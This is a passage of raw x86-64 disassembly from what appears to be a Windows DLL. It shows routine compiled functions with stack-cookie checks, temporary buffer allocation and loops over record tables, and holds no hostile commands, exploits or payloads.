   180004293:	74 05                	je     0x18000429a
   180004295:	39 39                	cmp    %edi,(%rcx)
   180004297:	0f 4f 39             	cmovg  (%rcx),%edi
   18000429a:	48 83 c1 0c          	add    $0xc,%rcx
   18000429e:	48 ff ca             	dec    %rdx
   1800042a1:	75 ed                	jne    0x180004290
   1800042a3:	41 8b 57 04          	mov    0x4(%r15),%edx
   1800042a7:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   1800042ab:	4c 8b c6             	mov    %rsi,%r8
   1800042ae:	41 ff 56 68          	call   *0x68(%r14)
   1800042b2:	85 c0                	test   %eax,%eax
   1800042b4:	75 21                	jne    0x1800042d7
   1800042b6:	8b 45 40             	mov    0x40(%rbp),%eax
   1800042b9:	85 c0                	test   %eax,%eax
   1800042bb:	7e 1a                	jle    0x1800042d7
   1800042bd:	48 8d 4e 0c          	lea    0xc(%rsi),%rcx
   1800042c1:	8b d0                	mov    %eax,%edx
   1800042c3:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   1800042c7:	74 05                	je     0x1800042ce
   1800042c9:	39 19                	cmp    %ebx,(%rcx)
   1800042cb:	0f 4f 19             	cmovg  (%rcx),%ebx
   1800042ce:	48 83 c1 0c          	add    $0xc,%rcx
   1800042d2:	48 ff ca             	dec    %rdx
   1800042d5:	75 ec                	jne    0x1800042c3
   1800042d7:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
   1800042dc:	f7 ef                	imul   %edi
   1800042de:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
   1800042e3:	c1 fa 05             	sar    $0x5,%edx
   1800042e6:	8b ca                	mov    %edx,%ecx
   1800042e8:	c1 e9 1f             	shr    $0x1f,%ecx
   1800042eb:	03 d1                	add    %ecx,%edx
   1800042ed:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
   1800042f1:	41 89 55 20          	mov    %edx,0x20(%r13)
   1800042f5:	f7 eb                	imul   %ebx
   1800042f7:	c1 fa 05             	sar    $0x5,%edx
   1800042fa:	8b c2                	mov    %edx,%eax
   1800042fc:	c1 e8 1f             	shr    $0x1f,%eax
   1800042ff:	03 d0                	add    %eax,%edx
   180004301:	41 89 55 24          	mov    %edx,0x24(%r13)
   180004305:	e9 21 01 00 00       	jmp    0x18000442b
   18000430a:	83 c0 fb             	add    $0xfffffffb,%eax
   18000430d:	83 f8 01             	cmp    $0x1,%eax
   180004310:	0f 87 22 01 00 00    	ja     0x180004438
   180004316:	49 8b 46 48          	mov    0x48(%r14),%rax
   18000431a:	48 85 c0             	test   %rax,%rax
   18000431d:	0f 84 15 01 00 00    	je     0x180004438
   180004323:	49 39 5e 50          	cmp    %rbx,0x50(%r14)
   180004327:	0f 84 0b 01 00 00    	je     0x180004438
   18000432d:	41 8b 57 04          	mov    0x4(%r15),%edx
   180004331:	33 c9                	xor    %ecx,%ecx
   180004333:	4c 8d 45 10          	lea    0x10(%rbp),%r8
   180004337:	48 89 4d 14          	mov    %rcx,0x14(%rbp)
   18000433b:	48 89 4d 1c          	mov    %rcx,0x1c(%rbp)
   18000433f:	48 89 4d 24          	mov    %rcx,0x24(%rbp)
   180004343:	48 89 4d 2c          	mov    %rcx,0x2c(%rbp)
   180004347:	48 89 4d 34          	mov    %rcx,0x34(%rbp)
   18000434b:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   18000434f:	89 5d 10             	mov    %ebx,0x10(%rbp)
   180004352:	ff d0                	call   *%rax
   180004354:	85 c0                	test   %eax,%eax
   180004356:	0f 85 dc 00 00 00    	jne    0x180004438
   18000435c:	8b 45 18             	mov    0x18(%rbp),%eax
   18000435f:	83 f8 02             	cmp    $0x2,%eax
   180004362:	0f 8c d0 00 00 00    	jl     0x180004438
   180004368:	8d 04 c5 14 00 00 00 	lea    0x14(,%rax,8),%eax
   18000436f:	48 63 f8             	movslq %eax,%rdi
   180004372:	48 8d 47 10          	lea    0x10(%rdi),%rax
   180004376:	48 3b c7             	cmp    %rdi,%rax
   180004379:	76 55                	jbe    0x1800043d0
   18000437b:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   18000437f:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   180004386:	77 31                	ja     0x1800043b9
   180004388:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   18000438c:	48 3b c1             	cmp    %rcx,%rax
   18000438f:	77 0a                	ja     0x18000439b
   180004391:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   180004398:	ff ff 0f 
   18000439b:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   18000439f:	e8 ec 12 00 00       	call   0x180005690
   1800043a4:	48 2b e0             	sub    %rax,%rsp
   1800043a7:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   1800043ac:	48 85 db             	test   %rbx,%rbx
   1800043af:	74 1f                	je     0x1800043d0
   1800043b1:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   1800043b7:	eb 13                	jmp    0x1800043cc
   1800043b9:	e8 02 12 00 00       	call   0x1800055c0
   1800043be:	48 8b d8             	mov    %rax,%rbx
   1800043c1:	48 85 c0             	test   %rax,%rax
   1800043c4:	74 0a                	je     0x1800043d0
   1800043c6:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   1800043cc:	48 83 c3 10          	add    $0x10,%rbx
   1800043d0:	4c 8b c7             	mov    %rdi,%r8
   1800043d3:	33 d2                	xor    %edx,%edx
   1800043d5:	48 8b cb             	mov    %rbx,%rcx
   1800043d8:	e8 83 0e 00 00       	call   0x180005260
   1800043dd:	8b 45 18             	mov    0x18(%rbp),%eax
   1800043e0:	4c 8b cb             	mov    %rbx,%r9
   1800043e3:	89 03                	mov    %eax,(%rbx)
   1800043e5:	41 8b 57 04          	mov    0x4(%r15),%edx
   1800043e9:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   1800043ed:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1800043f3:	41 ff 56 50          	call   *0x50(%r14)
   1800043f7:	85 c0                	test   %eax,%eax
   1800043f9:	75 2c                	jne    0x180004427
   1800043fb:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
   180004400:	f7 6b 14             	imull  0x14(%rbx)
   180004403:	c1 fa 05             	sar    $0x5,%edx
   180004406:	8b c2                	mov    %edx,%eax
   180004408:	c1 e8 1f             	shr    $0x1f,%eax
   18000440b:	03 d0                	add    %eax,%edx
   18000440d:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
   180004412:	41 89 55 20          	mov    %edx,0x20(%r13)
   180004416:	f7 6b 18             	imull  0x18(%rbx)
   180004419:	c1 fa 05             	sar    $0x5,%edx
   18000441c:	8b c2                	mov    %edx,%eax
   18000441e:	c1 e8 1f             	shr    $0x1f,%eax
   180004421:	03 d0                	add    %eax,%edx
   180004423:	41 89 55 24          	mov    %edx,0x24(%r13)
   180004427:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   18000442b:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   180004431:	75 05                	jne    0x180004438
   180004433:	e8 48 11 00 00       	call   0x180005580
   180004438:	41 8b 45 20          	mov    0x20(%r13),%eax
   18000443c:	41 0f af 45 1c       	imul   0x1c(%r13),%eax
   180004441:	c1 e0 07             	shl    $0x7,%eax
   180004444:	66 0f 6e c0          	movd   %eax,%xmm0
   180004448:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
   18000444b:	f3 0f 5e 05 dd cf 00 	divss  0xcfdd(%rip),%xmm0        # 0x180011430
   180004452:	00 
   180004453:	f3 41 0f 11 45 28    	movss  %xmm0,0x28(%r13)
   180004459:	48 8b 8d f0 00 00 00 	mov    0xf0(%rbp),%rcx
   180004460:	48 33 cd             	xor    %rbp,%rcx
   180004463:	e8 c8 0d 00 00       	call   0x180005230
   180004468:	48 8b 9d 50 01 00 00 	mov    0x150(%rbp),%rbx
   18000446f:	48 8d a5 00 01 00 00 	lea    0x100(%rbp),%rsp
   180004476:	41 5f                	pop    %r15
   180004478:	41 5e                	pop    %r14
   18000447a:	41 5d                	pop    %r13
   18000447c:	41 5c                	pop    %r12
   18000447e:	5f                   	pop    %rdi
   18000447f:	5e                   	pop    %rsi
   180004480:	5d                   	pop    %rbp
   180004481:	c3                   	ret
   180004482:	cc                   	int3
   180004483:	cc                   	int3
   180004484:	cc                   	int3
   180004485:	cc                   	int3
   180004486:	cc                   	int3
   180004487:	cc                   	int3
   180004488:	cc                   	int3
   180004489:	cc                   	int3
   18000448a:	cc                   	int3
   18000448b:	cc                   	int3
   18000448c:	cc                   	int3
   18000448d:	cc                   	int3
   18000448e:	cc                   	int3
   18000448f:	cc                   	int3
   180004490:	40 55                	rex push %rbp
   180004492:	41 54                	push   %r12
   180004494:	41 55                	push   %r13
   180004496:	41 56                	push   %r14
   180004498:	41 57                	push   %r15
   18000449a:	48 83 ec 40          	sub    $0x40,%rsp
   18000449e:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1800044a3:	48 89 5d 58          	mov    %rbx,0x58(%rbp)
   1800044a7:	48 89 75 60          	mov    %rsi,0x60(%rbp)
   1800044ab:	48 89 7d 68          	mov    %rdi,0x68(%rbp)
   1800044af:	48 8b 05 4a 4b 01 00 	mov    0x14b4a(%rip),%rax        # 0x180019000
   1800044b6:	48 33 c5             	xor    %rbp,%rax
   1800044b9:	48 89 45 18          	mov    %rax,0x18(%rbp)
   1800044bd:	48 8d b9 78 03 00 00 	lea    0x378(%rcx),%rdi
   1800044c4:	48 8b f1             	mov    %rcx,%rsi
   1800044c7:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1800044cb:	48 8b d7             	mov    %rdi,%rdx
   1800044ce:	ff 56 20             	call   *0x20(%rsi)
   1800044d1:	45 33 ed             	xor    %r13d,%r13d
   1800044d4:	44 39 2f             	cmp    %r13d,(%rdi)
   1800044d7:	0f 8e 9e 01 00 00    	jle    0x18000467b
   1800044dd:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   1800044e1:	48 8d 96 70 03 00 00 	lea    0x370(%rsi),%rdx
   1800044e8:	ff 56 28             	call   *0x28(%rsi)
   1800044eb:	85 c0                	test   %eax,%eax
   1800044ed:	0f 85 88 01 00 00    	jne    0x18000467b
   1800044f3:	6b 0f 68             	imul   $0x68,(%rdi),%ecx
   1800044f6:	e8 05 04 00 00       	call   0x180004900
   1800044fb:	48 89 86 60 03 00 00 	mov    %rax,0x360(%rsi)
   180004502:	4c 39 ae 70 03 00 00 	cmp    %r13,0x370(%rsi)
   180004509:	0f 84 6c 01 00 00    	je     0x18000467b
   18000450f:	48 85 c0             	test   %rax,%rax
   180004512:	0f 84 63 01 00 00    	je     0x18000467b
   180004518:	48 63 0f             	movslq (%rdi),%rcx
   18000451b:	33 d2                	xor    %edx,%edx
   18000451d:	4c 6b c1 68          	imul   $0x68,%rcx,%r8
   180004521:	48 8b c8             	mov    %rax,%rcx
   180004524:	e8 37 0d 00 00       	call   0x180005260
   180004529:	48 63 17             	movslq (%rdi),%rdx
   18000452c:	45 8b fd             	mov    %r13d,%r15d
   18000452f:	48 8d 0c 95 00 00 00 	lea    0x0(,%rdx,4),%rcx
   180004536:	00 
   180004537:	48 8d 41 10          	lea    0x10(%rcx),%rax
   18000453b:	48 3b c1             	cmp    %rcx,%rax
   18000453e:	76 5f                	jbe    0x18000459f
   180004540:	48 8d 0c 95 10 00 00 	lea    0x10(,%rdx,4),%rcx
   180004547:	00 
   180004548:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   18000454f:	77 35                	ja     0x180004586
   180004551:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   180004555:	48 3b c1             	cmp    %rcx,%rax
   180004558:	77 0a                	ja     0x180004564
   18000455a:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   180004561:	ff ff 0f 
   180004564:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   180004568:	e8 23 11 00 00       	call   0x180005690
   18000456d:	48 2b e0             	sub    %rax,%rsp
   180004570:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
   180004575:	48 85 db             	test   %rbx,%rbx
   180004578:	74 28                	je     0x1800045a2
   18000457a:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   180004580:	48 83 c3 10          	add    $0x10,%rbx
   180004584:	eb 1c                	jmp    0x1800045a2
   180004586:	e8 35 10 00 00       	call   0x1800055c0
   18000458b:	48 8b d8             	mov    %rax,%rbx
   18000458e:	48 85 c0             	test   %rax,%rax
   180004591:	74 0f                	je     0x1800045a2
   180004593:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   180004599:	48 83 c3 10          	add    $0x10,%rbx
   18000459d:	eb 03                	jmp    0x1800045a2
   18000459f:	49 8b dd             	mov    %r13,%rbx
   1800045a2:	41 8b cd             	mov    %r13d,%ecx
   1800045a5:	39 0f                	cmp    %ecx,(%rdi)
   1800045a7:	7e 2f                	jle    0x1800045d8
   1800045a9:	49 8b d5             	mov    %r13,%rdx
   1800045ac:	4c 8b c3             	mov    %rbx,%r8
   1800045af:	90                   	nop
   1800045b0:	48 8b 86 70 03 00 00 	mov    0x370(%rsi),%rax
   1800045b7:	44 39 ac 02 1c 03 00 	cmp    %r13d,0x31c(%rdx,%rax,1)
   1800045be:	00 
   1800045bf:	74 0a                	je     0x1800045cb
   1800045c1:	41 89 08             	mov    %ecx,(%r8)
   1800045c4:	41 ff c7             	inc    %r15d
   1800045c7:	49 83 c0 04          	add    $0x4,%r8
   1800045cb:	ff c1                	inc    %ecx
   1800045cd:	48 81 c2 24 06 00 00 	add    $0x624,%rdx
   1800045d4:	3b 0f                	cmp    (%rdi),%ecx
   1800045d6:	7c d8                	jl     0x1800045b0
   1800045d8:	4c 8b 8e 70 03 00 00 	mov    0x370(%rsi),%r9
   1800045df:	49 63 ff             	movslq %r15d,%rdi
   1800045e2:	48 8b cb             	mov    %rbx,%rcx
   1800045e5:	48 8d 14 bb          	lea    (%rbx,%rdi,4),%rdx
   1800045e9:	4c 8b c2             	mov    %rdx,%r8
   1800045ec:	4c 2b c3             	sub    %rbx,%r8
   1800045ef:	49 c1 f8 02          	sar    $0x2,%r8
   1800045f3:	e8 a8 f5 ff ff       	call   0x180003ba0
   1800045f8:	41 ba ff ff ff ff    	mov    $0xffffffff,%r10d
   1800045fe:	44 89 ae 68 03 00 00 	mov    %r13d,0x368(%rsi)
   180004605:	4d 8b c5             	mov    %r13,%r8
   180004608:	45 85 ff             	test   %r15d,%r15d
   18000460b:	7e 57                	jle    0x180004664
   18000460d:	0f 1f 00             	nopl   (%rax)
   180004610:	4e 63 0c 83          	movslq (%rbx,%r8,4),%r9
   180004614:	49 69 c9 24 06 00 00 	imul   $0x624,%r9,%rcx
   18000461b:	48 03 8e 70 03 00 00 	add    0x370(%rsi),%rcx
   180004622:	48 63 91 0c 01 00 00 	movslq 0x10c(%rcx),%rdx
   180004629:	48 63 81 08 01 00 00 	movslq 0x108(%rcx),%rax
   180004630:	48 c1 e2 20          	shl    $0x20,%rdx
   180004634:	48 0b d0             	or     %rax,%rdx
   180004637:	49 3b d2             	cmp    %r10,%rdx
   18000463a:	74 20                	je     0x18000465c
   18000463c:	48 63 86 68 03 00 00 	movslq 0x368(%rsi),%rax
   180004643:	4c 8b d2             	mov    %rdx,%r10
   180004646:	48 6b c8 68          	imul   $0x68,%rax,%rcx
   18000464a:	48 8b 86 60 03 00 00 	mov    0x360(%rsi),%rax
   180004651:	44 89 4c 01 60       	mov    %r9d,0x60(%rcx,%rax,1)
   180004656:	ff 86 68 03 00 00    	incl   0x368(%rsi)
   18000465c:	49 ff c0             	inc    %r8
   18000465f:	4c 3b c7             	cmp    %rdi,%r8
   180004662:	7c ac                	jl     0x180004610
   180004664:	48 85 db             	test   %rbx,%rbx
   180004667:	74 12                	je     0x18000467b
   180004669:	81 7b f0 dd dd 00 00 	cmpl   $0xdddd,-0x10(%rbx)
   180004670:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   180004674:	75 05                	jne    0x18000467b
   180004676:	e8 05 0f 00 00       	call   0x180005580
   18000467b:	45 8b e5             	mov    %r13d,%r12d
   18000467e:	44 39 ae 68 03 00 00 	cmp    %r13d,0x368(%rsi)
   180004685:	0f 8e 38 01 00 00    	jle    0x1800047c3
   18000468b:	49 8b dd             	mov    %r13,%rbx
   18000468e:	66 90                	xchg   %ax,%ax
   180004690:	48 8b be 60 03 00 00 	mov    0x360(%rsi),%rdi
   180004697:	45 8b fd             	mov    %r13d,%r15d
   18000469a:	48 63 44 3b 60       	movslq 0x60(%rbx,%rdi,1),%rax
   18000469f:	48 69 c8 24 06 00 00 	imul   $0x624,%rax,%rcx
   1800046a6:	48 03 8e 70 03 00 00 	add    0x370(%rsi),%rcx
   1800046ad:	44 89 2c 3b          	mov    %r13d,(%rbx,%rdi,1)
   1800046b1:	4c 8d 71 08          	lea    0x8(%rcx),%r14
   1800046b5:	48 8d 81 18 01 00 00 	lea    0x118(%rcx),%rax
   1800046bc:	48 89 44 3b 08       	mov    %rax,0x8(%rbx,%rdi,1)
   1800046c1:	4d 85 f6             	test   %r14,%r14
   1800046c4:	74 40                	je     0x180004706
   1800046c6:	48 8d 15 4b cd 00 00 	lea    0xcd4b(%rip),%rdx        # 0x180011418
   1800046cd:	49 8b ce             	mov    %r14,%rcx
   1800046d0:	e8 3f 16 00 00       	call   0x180005d14
   1800046d5:	48 85 c0             	test   %rax,%rax
   1800046d8:	74 2c                	je     0x180004706
   1800046da:	ba 08 00 00 00       	mov    $0x8,%edx
   1800046df:	4c 8d 40 04          	lea    0x4(%rax),%r8
   1800046e3:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   1800046e7:	44 8d 4a fc          	lea    -0x4(%rdx),%r9d
   1800046eb:	e8 68 15 00 00       	call   0x180005c58
   1800046f0:	33 d2                	xor    %edx,%edx
   1800046f2:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   1800046f6:	44 8d 42 10          	lea    0x10(%rdx),%r8d
   1800046fa:	44 88 6d 0c          	mov    %r13b,0xc(%rbp)
   1800046fe:	e8 d5 1a 00 00       	call   0x1800061d8
   180004703:	44 8b f8             	mov    %eax,%r15d
   180004706:	44 89 7c 3b 10       	mov    %r15d,0x10(%rbx,%rdi,1)
   18000470b:	45 8b fd             	mov    %r13d,%r15d
   18000470e:	4d 85 f6             	test   %r14,%r14
   180004711:	74 40                	je     0x180004753
   180004713:	48 8d 15 06 cd 00 00 	lea    0xcd06(%rip),%rdx        # 0x180011420
   18000471a:	49 8b ce             	mov    %r14,%rcx
   18000471d:	e8 f2 15 00 00       	call   0x180005d14
   180004722:	48 85 c0             	test   %rax,%rax
   180004725:	74 2c                	je     0x180004753
   180004727:	ba 08 00 00 00       	mov    $0x8,%edx
   18000472c:	4c 8d 40 04          	lea    0x4(%rax),%r8
   180004730:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180004734:	44 8d 4a fc          	lea    -0x4(%rdx),%r9d
   180004738:	e8 1b 15 00 00       	call   0x180005c58
   18000473d:	33 d2                	xor    %edx,%edx
   18000473f:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180004743:	44 8d 42 10          	lea    0x10(%rdx),%r8d
   180004747:	44 88 6d 14          	mov    %r13b,0x14(%rbp)
   18000474b:	e8 88 1a 00 00       	call   0x1800061d8
   180004750:	44 8b f8             	mov    %eax,%r15d
   180004753:	44 89 7c 3b 14       	mov    %r15d,0x14(%rbx,%rdi,1)
   180004758:	45 8b fd             	mov    %r13d,%r15d
   18000475b:	4d 85 f6             	test   %r14,%r14
   18000475e:	74 40                	je     0x1800047a0
   180004760:	48 8d 15 c1 cc 00 00 	lea    0xccc1(%rip),%rdx        # 0x180011428
   180004767:	49 8b ce             	mov    %r14,%rcx
   18000476a:	e8 a5 15 00 00       	call   0x180005d14
   18000476f:	48 85 c0             	test   %rax,%rax
   180004772:	74 2c                	je     0x1800047a0
   180004774:	ba 04 00 00 00       	mov    $0x4,%edx
   180004779:	4c 8d 40 04          	lea    0x4(%rax),%r8
   18000477d:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   180004781:	44 8d 4a fe          	lea    -0x2(%rdx),%r9d
   180004785:	e8 ce 14 00 00       	call   0x180005c58
   18000478a:	33 d2                	xor    %edx,%edx
   18000478c:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   180004790:	44 8d 42 10          	lea    0x10(%rdx),%r8d
   180004794:	44 88 6d 02          	mov    %r13b,0x2(%rbp)
   180004798:	e8 3b 1a 00 00       	call   0x1800061d8
   18000479d:	44 8b f8             	mov    %eax,%r15d
   1800047a0:	44 89 7c 3b 18       	mov    %r15d,0x18(%rbx,%rdi,1)
   1800047a5:	4c 89 6c 3b 1c       	mov    %r13,0x1c(%rbx,%rdi,1)
   1800047aa:	4c 89 6c 3b 24       	mov    %r13,0x24(%rbx,%rdi,1)
   1800047af:	41 ff c4             	inc    %r12d
   1800047b2:	48 83 c3 68          	add    $0x68,%rbx
   1800047b6:	44 3b a6 68 03 00 00 	cmp    0x368(%rsi),%r12d
   1800047bd:	0f 8c cd fe ff ff    	jl     0x180004690
   1800047c3:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   1800047c7:	48 33 cd             	xor    %rbp,%rcx
   1800047ca:	e8 61 0a 00 00       	call   0x180005230
   1800047cf:	48 8b 5d 58          	mov    0x58(%rbp),%rbx
   1800047d3:	48 8b 75 60          	mov    0x60(%rbp),%rsi
   1800047d7:	48 8b 7d 68          	mov    0x68(%rbp),%rdi
   1800047db:	48 8d 65 20          	lea    0x20(%rbp),%rsp
   1800047df:	41 5f                	pop    %r15
   1800047e1:	41 5e                	pop    %r14
   1800047e3:	41 5d                	pop    %r13
   1800047e5:	41 5c                	pop    %r12
   1800047e7:	5d                   	pop    %rbp
   1800047e8:	c3                   	ret
   1800047e9:	cc                   	int3
   1800047ea:	cc                   	int3
   1800047eb:	cc                   	int3
   1800047ec:	cc                   	int3
   1800047ed:	cc                   	int3
   1800047ee:	cc                   	int3
   1800047ef:	cc                   	int3
   1800047f0:	4c 8b dc             	mov    %rsp,%r11
   1800047f3:	53                   	push   %rbx
   1800047f4:	48 81 ec 90 01 00 00 	sub    $0x190,%rsp
   1800047fb:	48 8b 05 fe 47 01 00 	mov    0x147fe(%rip),%rax        # 0x180019000
   180004802:	48 33 c4             	xor    %rsp,%rax
   180004805:	48 89 84 24 70 01 00 	mov    %rax,0x170(%rsp)
   18000480c:	00 
   18000480d:	48 83 79 38 00       	cmpq   $0x0,0x38(%rcx)
   180004812:	48 8b d9             	mov    %rcx,%rbx
   180004815:	0f 84 bd 00 00 00    	je     0x1800048d8
   18000481b:	49 89 73 18          	mov    %rsi,0x18(%r11)
   18000481f:	33 f6                	xor    %esi,%esi
   180004821:	39 b1 68 03 00 00    	cmp    %esi,0x368(%rcx)
   180004827:	0f 8e a3 00 00 00    	jle    0x1800048d0
   18000482d:	49 89 6b 10          	mov    %rbp,0x10(%r11)
   180004831:	49 89 7b f0          	mov    %rdi,-0x10(%r11)
   180004835:	4d 89 73 e8          	mov    %r14,-0x18(%r11)
   180004839:	44 8b f6             	mov    %esi,%r14d
   18000483c:	0f 1f 40 00          	nopl   0x0(%rax)
   180004840:	48 8b bb 60 03 00 00 	mov    0x360(%rbx),%rdi
   180004847:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   18000484b:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180004850:	49 03 fe             	add    %r14,%rdi
   180004853:	48 63 47 60          	movslq 0x60(%rdi),%rax
   180004857:	48 69 e8 24 06 00 00 	imul   $0x624,%rax,%rbp
   18000485e:	48 03 ab 70 03 00 00 	add    0x370(%rbx),%rbp
   180004865:	8b 55 04             	mov    0x4(%rbp),%edx
   180004868:	ff 53 38             	call   *0x38(%rbx)
   18000486b:	85 c0                	test   %eax,%eax
   18000486d:	75 14                	jne    0x180004883
   18000486f:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180004873:	89 07                	mov    %eax,(%rdi)
   180004875:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   18000487a:	75 07                	jne    0x180004883
   18000487c:	8b 44 24 24          	mov    0x24(%rsp),%eax
   180004880:	89 47 1c             	mov    %eax,0x1c(%rdi)
   180004883:	48 8b d7             	mov    %rdi,%rdx
   180004886:	48 8b cb             	mov    %rbx,%rcx
   180004889:	e8 62 f8 ff ff       	call   0x1800040f0
   18000488e:	8b 55 04             	mov    0x4(%rbp),%edx
   180004891:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   180004895:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   18000489a:	ff 53 30             	call   *0x30(%rbx)
   18000489d:	85 c0                	test   %eax,%eax
   18000489f:	75 09                	jne    0x1800048aa
   1800048a1:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   1800048a6:	48 89 47 30          	mov    %rax,0x30(%rdi)
   1800048aa:	ff c6                	inc    %esi
   1800048ac:	49 83 c6 68          	add    $0x68,%r14
   1800048b0:	3b b3 68 03 00 00    	cmp    0x368(%rbx),%esi
   1800048b6:	7c 88                	jl     0x180004840
   1800048b8:	4c 8b b4 24 80 01 00 	mov    0x180(%rsp),%r14
   1800048bf:	00 
   1800048c0:	48 8b bc 24 88 01 00 	mov    0x188(%rsp),%rdi
   1800048c7:	00 
   1800048c8:	48 8b ac 24 a8 01 00 	mov    0x1a8(%rsp),%rbp
   1800048cf:	00 
   1800048d0:	48 8b b4 24 b0 01 00 	mov    0x1b0(%rsp),%rsi
   1800048d7:	00 
   1800048d8:	48 8b 8c 24 70 01 00 	mov    0x170(%rsp),%rcx
   1800048df:	00 
   1800048e0:	48 33 cc             	xor    %rsp,%rcx
   1800048e3:	e8 48 09 00 00       	call   0x180005230
   1800048e8:	48 81 c4 90 01 00 00 	add    $0x190,%rsp
   1800048ef:	5b                   	pop    %rbx
   1800048f0:	c3                   	ret
   1800048f1:	cc                   	int3
   1800048f2:	cc                   	int3
   1800048f3:	cc                   	int3
   1800048f4:	cc                   	int3
   1800048f5:	cc                   	int3
   1800048f6:	cc                   	int3
   1800048f7:	cc                   	int3
   1800048f8:	cc                   	int3
   1800048f9:	cc                   	int3
   1800048fa:	cc                   	int3
   1800048fb:	cc                   	int3
   1800048fc:	cc                   	int3
   1800048fd:	cc                   	int3
   1800048fe:	cc                   	int3
   1800048ff:	cc                   	int3
   180004900:	48 8b 05 e1 5e 01 00 	mov    0x15ee1(%rip),%rax        # 0x18001a7e8
   180004907:	48 85 c0             	test   %rax,%rax
   18000490a:	74 03                	je     0x18000490f
   18000490c:	48 ff e0             	rex.W jmp *%rax
   18000490f:	48 63 c9             	movslq %ecx,%rcx
   180004912:	e9 a9 0c 00 00       	jmp    0x1800055c0
   180004917:	cc                   	int3
   180004918:	cc                   	int3
   180004919:	cc                   	int3
   18000491a:	cc                   	int3
   18000491b:	cc                   	int3
   18000491c:	cc                   	int3
   18000491d:	cc                   	int3
   18000491e:	cc                   	int3
   18000491f:	cc                   	int3
   180004920:	48 85 c9             	test   %rcx,%rcx
   180004923:	74 3c                	je     0x180004961
   180004925:	53                   	push   %rbx
   180004926:	48 83 ec 20          	sub    $0x20,%rsp
   18000492a:	48 8b d9             	mov    %rcx,%rbx
   18000492d:	48 8b 09             	mov    (%rcx),%rcx
   180004930:	48 85 c9             	test   %rcx,%rcx
   180004933:	74 27                	je     0x18000495c
   180004935:	48 8b 05 b4 5e 01 00 	mov    0x15eb4(%rip),%rax        # 0x18001a7f0
   18000493c:	48 85 c0             	test   %rax,%rax
   18000493f:	74 0f                	je     0x180004950
   180004941:	ff d0                	call   *%rax
   180004943:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   18000494a:	48 83 c4 20          	add    $0x20,%rsp
   18000494e:	5b                   	pop    %rbx
   18000494f:	c3                   	ret
   180004950:	e8 2b 0c 00 00       	call   0x180005580
   180004955:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   18000495c:	48 83 c4 20          	add    $0x20,%rsp
   180004960:	5b                   	pop    %rbx
   180004961:	c3                   	ret
   180004962:	cc                   	int3
   180004963:	cc                   	int3
   180004964:	cc                   	int3
   180004965:	cc                   	int3
   180004966:	cc                   	int3
   180004967:	cc                   	int3
   180004968:	cc                   	int3
   180004969:	cc                   	int3
   18000496a:	cc                   	int3
   18000496b:	cc                   	int3
   18000496c:	cc                   	int3
   18000496d:	cc                   	int3
   18000496e:	cc                   	int3
   18000496f:	cc                   	int3
   180004970:	40 53                	rex push %rbx
   180004972:	41 56                	push   %r14
   180004974:	41 57                	push   %r15
   180004976:	48 83 ec 20          	sub    $0x20,%rsp
   18000497a:	48 8b 1d 6f 5e 01 00 	mov    0x15e6f(%rip),%rbx        # 0x18001a7f0
   180004981:	45 33 ff             	xor    %r15d,%r15d
   180004984:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   180004989:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   18000498e:	4c 8b f1             	mov    %rcx,%r14
   180004991:	41 8b f7             	mov    %r15d,%esi
   180004994:	44 39 b9 68 03 00 00 	cmp    %r15d,0x368(%rcx)
   18000499b:	7e 57                	jle    0x1800049f4
   18000499d:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   1800049a2:	41 8b ef             	mov    %r15d,%ebp
   1800049a5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1800049ac:	00 00 00 00 
   1800049b0:	49 8b be 60 03 00 00 	mov    0x360(%r14),%rdi
   1800049b7:	48 83 c7 40          	add    $0x40,%rdi
   1800049bb:	48 03 fd             	add    %rbp,%rdi
